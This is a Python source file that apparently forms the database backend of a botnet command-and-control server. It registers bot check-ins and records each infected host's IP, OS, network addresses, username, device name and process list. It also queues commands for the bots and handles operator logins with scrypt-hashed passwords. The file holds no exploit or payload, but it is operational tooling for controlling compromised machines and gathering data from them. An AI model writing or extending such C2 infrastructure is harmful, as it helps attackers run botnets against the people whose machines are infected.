import os
import uuid
import time
import hashlib
import sqlite3 as sql
from datetime import datetime


def initdb() -> sql.Connection:
    """
    Initializes database by connecting and attempting to create tables for bots/userdata
    :return: SQLite connection
    """
    conn = sql.connect('notmemory.sqlite')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS bots (uuid TEXT NOT NULL UNIQUE, checkin INTEGER, ip TEXT, os TEXT, networkaddresses TEXT, username TEXT, devicename TEXT, region TEXT, memory INTEGER, commandqueue TEXT, commandout TEXT, processlist TEXT, PRIMARY KEY(uuid))''')
    cur.execute('''CREATE TABLE IF NOT EXISTS userdata (email TEXT, username TEXT, hash BLOB, salt BLOB, resettoken BLOB, resettime INTEGER)''')
    conn.commit()
    return conn


def add_bot_to_db(conn: sql.Connection, id, checkin, ip="", networkaddresses="", username="", devicename=""):
    cur = conn.cursor()
    cur.execute("SELECT checkin FROM bots WHERE uuid=?", (id,))
    if len(cur.fetchall()) > 0:
        print("Bot already exists: " + id)
        return
    else:
        cur.execute("INSERT INTO bots(uuid, checkin, ip, networkaddresses, username, devicename, commandqueue, commandout) VALUES(?, ?, ?, ?, ?, ?, ?, ?)", (id, checkin, ip, networkaddresses, username, devicename, "", ""))
        conn.commit()
        print("Added: " + id + " " + str(checkin))
        return


def checkin(conn: sql.Connection, id):
    cur = conn.cursor()
    checkin = int(time.time())
    cur.execute('''UPDATE bots SET checkin=? WHERE uuid=?''', (checkin, id))
    cur.fetchall()
    conn.commit()
    print("Checkin logged: " + id + " " + str(checkin))


def get_bot_info(conn: sql.Connection, id):
    cur = conn.cursor()
    cur.execute('''SELECT * FROM bots WHERE uuid=?''', (id,))
    return cur.fetchone()


def bot_tostringlist(conn:sql.Connection, id):
    """
    Used in bot.html to generate bot report
    :param conn: sqlite connection
    :param id: bot ID
    :return: list of strings to print
    """
    cur = conn.cursor()
    cur.execute('''SELECT uuid, checkin, ip, username, devicename, region, memory, commandqueue, os FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    lst = []
    lst.append("UUID: {}".format(data[0]))
    lst.append("Last Checkin: {} UTC".format((datetime.utcfromtimestamp(data[1]).strftime('%Y-%m-%d %H:%M:%S'))))
    lst.append("IP: {}".format(data[2]))
    lst.append("OS: {}".format(data[8]))
    lst.append("Username: {}".format(data[3]))
    lst.append("Device Name: {}".format(data[4]))
    lst.append("Region: {}".format(data[5]))
    lst.append("Memory Amount: {}".format(data[6]))
    lst.append("Command queue: {}".format(data[7]))
    return lst


def bot_nwaddrtostring(conn:sql.Connection, id):
    """
    Used in botnetworkaddresslist.html to generate network addr report
    :param conn: sqlite connection
    :param id: bot id
    :return: list of network addresses (MAC/IP) of the indicated bot
    """
    cur = conn.cursor()
    cur.execute('''SELECT networkaddresses FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    if data:
        return data[0].upper().split(",")
    else:
        return "No network address data"


def bot_pstostring(conn:sql.Connection, id):
    """
    Used in botproclist.html to generate process list report
    :param conn: sqlite connection
    :param id: bot id
    :return: list of processes and PIDs of the indicated bot
    """
    cur = conn.cursor()
    cur.execute('''SELECT processlist FROM bots WHERE uuid=?''', (id,))
    data = cur.fetchone()
    if data:
        return data[0].split("&")
    else:
        return "No network address data"


def update_proclist(conn: sql.Connection, id, procstring):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET processlist = ? WHERE uuid=?", (procstring, id))
    conn.commit()


def update_ip(conn: sql.Connection, id, ip):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET ip = ? WHERE uuid=?", (ip, id))
    conn.commit()


def update_os(conn: sql.Connection, id, os):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET os = ? WHERE uuid=?", (os, id))
    conn.commit()


def update_networkaddresses(conn: sql.Connection, id, networkaddresses):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET networkaddresses = ? WHERE uuid=?", (networkaddresses, id))
    conn.commit()


def update_username(conn: sql.Connection, id, username):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET username = ? WHERE uuid=?", (username, id))
    conn.commit()


def update_devicename(conn: sql.Connection, id, devicename):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET devicename = ? WHERE uuid=?", (devicename, id))
    conn.commit()


def update_region(conn: sql.Connection, id, region):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET region = ? WHERE uuid=?", (region, id))
    conn.commit()


def update_memory(conn: sql.Connection, id, memory):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET memory = ? WHERE uuid=?", (int(memory), id))
    conn.commit()


def update_commandqueue(conn: sql.Connection, id, cmd):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET commandqueue = ? WHERE uuid=?", (cmd, id))
    conn.commit()


def get_bot_commandqueue(conn: sql.Connection, id):
    cur = conn.cursor()
    cur.execute("SELECT commandqueue FROM bots WHERE uuid=?", (id,))
    return cur.fetchone()


def get_all_bot_ids(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT uuid FROM bots ORDER BY checkin DESC')
    return_val = cur.fetchall()
    return return_val

def get_bot_count(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT COUNT(uuid) FROM bots')
    return_val = cur.fetchone()[0]
    return return_val

def get_user_count(conn: sql.Connection):
    cur = conn.cursor()
    cur.execute('SELECT COUNT(username) FROM userdata')
    return_val = cur.fetchone()[0]
    return return_val

def hash_my_password(password, salt):
    scrypt_key = hashlib.scrypt(password=password.encode(), salt=salt, n=16384, r=8, p=1)
    return scrypt_key


def add_user(conn: sql.Connection, email, username, password):
    cur = conn.cursor()
    salt = os.urandom(16)
    hash = hash_my_password(password, salt)
    user_data = (email, username, hash, salt, None, 0)
    cur.execute("INSERT INTO userdata VALUES (?, ?, ?, ?, ?, ?)", user_data)
    conn.commit()
    return True


def authenticate_user(conn: sql.Connection, user, password):
    cur = conn.cursor()
    cur.execute('SELECT salt, hash, username FROM userdata WHERE username=? OR email=?', (user, user,))
    db_data = cur.fetchone()
    if db_data is None:
        return False, None

    salt = db_data[0]
    good_hash = db_data[1]
    user_name = db_data[2]

    auth_hash = hash_my_password(password, salt)
    if good_hash == auth_hash:
        return True, user_name
    else:
        return False, None

